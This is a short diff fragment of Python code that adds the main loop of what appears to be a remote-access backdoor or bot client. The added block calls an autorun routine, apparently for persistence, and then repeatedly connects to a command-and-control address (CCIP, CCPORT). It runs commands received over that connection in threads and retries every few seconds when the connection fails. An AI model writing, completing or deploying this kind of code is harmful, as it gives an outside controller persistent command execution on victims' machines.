@@ -47,3 +47,16 @@ def cli(client):
                 return
             else: 
                 threading.Thread(target=cmd, args=(client, data)).start()
+                
+    except Exception as error:
+        client.close()
+        
+if __name__ == '__main__':
+    autorun()
+    while True: 
+        client = conn(CCIP, CCPORT)
+        if client:
+            cli(client)
+        else:
+            time.sleep(2.5)
+            
